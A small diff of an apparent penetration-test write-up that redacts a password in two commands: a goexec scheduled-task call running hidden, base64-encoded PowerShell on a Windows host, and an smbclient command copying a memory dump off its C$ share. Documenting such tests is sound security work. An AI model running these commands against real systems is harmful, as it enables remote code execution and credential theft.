@@ -49,7 +49,7 @@ A base64-encoded PowerShell payload was delivered via `goexec` using the Task Sc
 # [Kali]
 ./goexec tsch create 192.168.1.52 \
   -u 'ubuntu' \
-  -p 'j44****' \
+  -p 'xxx****' \
   --task '\systemshell' \
   --exec 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' \
   --args "-NoP -NonI -W Hidden -Enc $ENCODED"
@@ -61,7 +61,7 @@ The task was configured to self-delete after execution. Dump completed in approx
 
 ```bash
 # [Kali]
-smbclient //192.168.1.52/C$ -U 'ubuntu%j44****' \
+smbclient //192.168.1.52/C$ -U 'ubuntu%xxx****' \
   -c 'get Windows\Temp\out2.dmp /tmp/out290425_SERVER_2025PATCHED_UBR_1742.dmp'
 ```
 
